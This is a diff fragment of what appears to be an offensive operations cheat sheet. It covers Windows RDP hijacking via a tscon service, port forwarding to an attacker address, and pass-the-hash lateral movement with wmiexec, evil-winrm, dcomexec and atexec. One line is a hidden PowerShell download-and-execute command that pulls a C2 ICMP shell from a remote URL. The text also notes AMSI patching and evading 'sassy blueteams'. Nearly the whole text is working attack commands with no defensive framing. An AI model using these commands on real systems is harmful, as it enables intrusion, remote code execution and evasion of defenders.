 	netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=<TARGETPORT> connectaddress=<ATTACKERTIP>
 
-	# hijack rdp, query tscon ID, create service
+	# on box of choice, hijack rdp, query tscon ID, create service (for sassy blueteams, especially useful on gui dc).
 	query user # find tscon ID, e.g. 1
 	sc create rdphijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
 	net start rdphijack
@@ -371,9 +449,9 @@
 ```	
 ###### 8.) Lateral movement via Windows and Linux.
 ```txt
-	# ongoing access
-	proxychains wmiexec.py -nooutput -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP> "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))";
+	# ongoing access, order of presedence (note patch amsi on all powershell)
 	proxychains evil-winrm -i <IP> -u <USER> -H <NTLMHASH> -s ./modules -e ./modules -P 5985;Bypass-4MSI
+	proxychains wmiexec.py -nooutput -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP> "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))";
 	proxychains wmiexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
 	proxychains dcomexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
 	proxychains atexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
